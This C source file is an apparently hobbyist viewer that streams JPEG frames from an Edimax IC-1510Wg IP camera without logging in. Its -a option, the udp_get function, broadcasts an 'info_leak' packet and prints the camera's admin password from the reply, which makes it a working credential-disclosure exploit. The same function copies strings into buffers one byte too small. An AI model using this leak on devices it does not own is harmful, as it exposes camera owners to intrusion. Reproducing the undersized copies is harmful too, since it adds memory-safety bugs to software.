/*
* util to get pictures from Edimax IC-1510Wg as video
* alpha 0.022
*
* This program is free software; you can redistribute it and/or modify
* it under the terms of the GNU General Public License version 2 as
* published by the Free Software Foundation.
+
* authors:
* (C) 2010  Thorben Went <info at dokumenteundeinstellungen dot de>
* (C) 2010  m0x <unkown>
*
*/

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <signal.h>
#include "display.h"

#define IP "192.168.178.25"
#define PORT 4321 /*default video-port is 4321*/
#define LOGIN_SIZE 120 /*size of login-packet*/
#define PICP_SIZE 30000 
#define VERSION "alpha 0.02"


int offset;
char picbuffer[PICP_SIZE];

void error(const char * str){
	printf("%s\n", str);
	fflush(stdout);
	close_display();
	exit(1);
}


void udp_get(void) {
	int sockfd, n, i = 0;
	struct sockaddr_in dest, fromcam; // connector's address information
	struct hostent *he;
	size_t addr_len;
	int broadcast = 1;
	char text[623], *passwd, *name;
	FILE *file;

	char info_leak[] = { 0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x02, 0xff, 0xfd };

	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
		error("Creakt socket\n");

	// this call is what allows broadcast packets to be sent:
	if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast,sizeof broadcast) == -1) 
		error("setsockopt (SO_BROADCAST)\n");
	
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof broadcast) == -1)
		error("setsockopt (SO_REUSEADDR)\n");

	dest.sin_family = AF_INET;     // host byte order
	dest.sin_port = htons(13364); // short, network byte order
	dest.sin_addr.s_addr = INADDR_BROADCAST;   
	memset(dest.sin_zero, '\0', sizeof dest.sin_zero);

	if (bind(sockfd, (struct sockaddr *) &dest, sizeof(dest)) == -1) /* we want source and dest-port to be 13364 */
		error("Bind\n");

	if ((n=sendto(sockfd, info_leak, sizeof(info_leak), 0, (struct sockaddr *)&dest, sizeof dest)) == -1)
		error("sendto\n");

	/* printf("sent %d bytes to %s\n", n, inet_ntoa(dest.sin_addr)); */
	addr_len = sizeof fromcam;	
	for (i = 0; i < 2; i++) { /* 1. recv get our own packet back. we need the 2. packet */
		memset(text, 0, sizeof(text));
		n = recvfrom(sockfd, text, sizeof(text), 0, (struct sockaddr *)&fromcam, &addr_len);
	}
	close(sockfd);
	/* file = fopen("debuf","w");
	fwrite(text,sizeof(text[0]),n,file);
	fclose(file); */
	/* printf("Read %i bytes of broadcast data\n", n); */

        /* get len of camname...*/
        n = strlen(text+170);
        /* to malloc this len to passwd */
        name = malloc(n);
        /* then copy string from packet */
        strcpy(name, text+170);

	/* get len of passwd...*/
	n = strlen(text+333);
	/* to malloc this len to passwd */
	passwd = malloc(n);
	/* then copy string from packet */
	strcpy(passwd, text+333);
	printf("Password for Cam %s(%s) is: %s\n", name, inet_ntoa(fromcam.sin_addr), passwd);

	exit(0);
}


void sigintfix(int sig){
	if(sig == SIGINT)
		error("Killed");
}

void show_help(char *argv[]) {
	printf("Edimax Video-Viewer %s\n\n",VERSION);
	printf("Usage:\n");
	printf("%s [Option]\n\n",argv[0]);
	printf("Options:\n");
	printf("-s\tSnapshot, write one picture to file\n");
	printf("-a\tLooks after the admin-pw of device\n");
	printf("-h\tYou currently looking at it\n\n");
	printf("Without options the binary will output\n");
	printf("a pseudo-video by requesting pic by pic.\n");
}

void pic_req(int sockfd) {
	char recbuffer[PICP_SIZE];

	int loop = 1,
	    n = 0,
	    i = 0;

	offset = 0;
	char picrp[] = { /*picture request packet: 4. byte (0x0e)*/
	0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	memset(&recbuffer, 0, sizeof(recbuffer));
	memset(&picbuffer, 0, sizeof(picbuffer));
 
	if((n = write(sockfd, picrp, sizeof(picrp))) == -1 )
		error("Error while write picrp");
	
	while(loop)
	{
		if ((n = recv(sockfd, recbuffer, PICP_SIZE ,0)) == -1)
			error("Error while read picr-answer");
		/*if(PICP_SIZE-offset<n)
		{
			memcpy(picbuffer+offset,recbuffer, PICP_SIZE-offset);
			offset+=PICP_SIZE-offset;
		} else {*/  
			memcpy(picbuffer+offset,recbuffer, n);
			offset += n;
		/*}*/
		if(offset>1 && picbuffer[offset-2] == (char)0xff && picbuffer[offset-1] == (char)0xd9)
			loop=0;

		if(loop && offset == PICP_SIZE) 
		{
			printf("buffer filled but no valid jpeg arrived!\n");
			return;
		}
	}
	
}

/* Login-Packet for first tests. Hardcoded username 1 with password muh 
int login_cam(int sockfd) {
	char loginp[] = { 0x00, 0x00, 0x00, 0x01, 0x31, 0x00, 0x6d, 0x75, 
0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; 

	if (write(sockfd, loginp, sizeof(loginp)) == -1 )
		error("Error while write login\n");

	if (read(sockfd, buffer, 120) == -1) 
		error("Error while read login-answer\n");
	
	if (buffer[3] == 0x08) {
		return 1;
	
	}
} */


int main(int argc, char *argv[]) {
	int len, sockfd, login, c, snap = 0;
	struct sockaddr_in dest;
	FILE *file;
	int res;


	while ((c = getopt (argc, argv, "sah")) != -1)
	switch (c){
	case 's':
		snap = 1;
		break;
	case 'a':
		udp_get();
		break;
	case 'h':
		show_help(argv);
		exit(0);
		break;
	}

	if (!snap)
	{/* FIX: Add option to define other resolutions*/
		res = init_display(320,240); 
		printf("PID: %d\n", getpid());
	}

	signal(SIGINT, sigintfix);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	if(sockfd == -1)
	error("Error while creating socket..\n");
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_family = AF_INET;
	dest.sin_addr.s_addr = inet_addr(IP); /* set destination IP number */ 
	dest.sin_port = htons(PORT);                /* set destination port number */

	if (connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1)
		error("Error while connecting to "IP);
		
  /*
	if ((login=login_cam(sockfd)) == -1){ 
		error("Error in login\n");
		exit(0);
	}
	else if (login == 1) {
		printf("Login success!\n");
	}*/
  
        if (snap) {
		file = fopen("snapshot.jpg","w");
                pic_req(sockfd);
		fwrite(picbuffer+28,sizeof(picbuffer[0]),offset-28,file);
		fclose(file);
                exit(0);
        } else {
	        /* main-loop for pseudo-video*/
		while(1) {
			pic_req(sockfd);
        		show_jpegmem(picbuffer+28, offset-28);
			
			if(update_display() == -1) /* SIGINT will be handled by update_display*/
				exit(0);
		}
	}
        /* FIX: Add option to choice write and display writen file
        show_jpegfile("file.jpg");*/

	return 0;
}
